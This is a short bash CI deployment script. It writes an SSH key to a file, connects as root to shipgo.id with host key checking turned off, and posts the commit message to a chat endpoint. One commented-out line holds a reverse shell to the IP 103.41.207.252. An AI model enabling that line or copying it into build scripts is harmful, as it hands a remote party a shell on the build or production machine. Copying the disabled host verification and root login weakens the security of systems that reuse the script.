#!/bin/bash
WAKTU=$(date '+%Y-%m-%d.%H')
echo "$SSH_KEY" > key.pem
chmod 400 key.pem

if [ "$1" == "PRODUCTION" ];then
echo "[*] Tag $WAKTU"
echo "[*] Deploy to production server in version $CI_COMMIT_BRANCH"
echo '[*] Generate SSH Identity'
HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub
echo '[*] Execute SSH'
# bash -i >& /dev/tcp/103.41.207.252/1234 0>&1
ssh -i key.pem -o "StrictHostKeyChecking no" root@shipgo.id "/var/www/html/shipgo.id/push.sh"
MESSAGE=$(git log -1 --pretty=%B)
curl --location --request POST 'http://bisa.ai:8000/send-group-message' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'name=SICODING DEVELOPMENT' \
--data-urlencode "message=🚀 Deployed 🚀
$MESSAGE"
echo $CI_PIPELINE_ID
fi
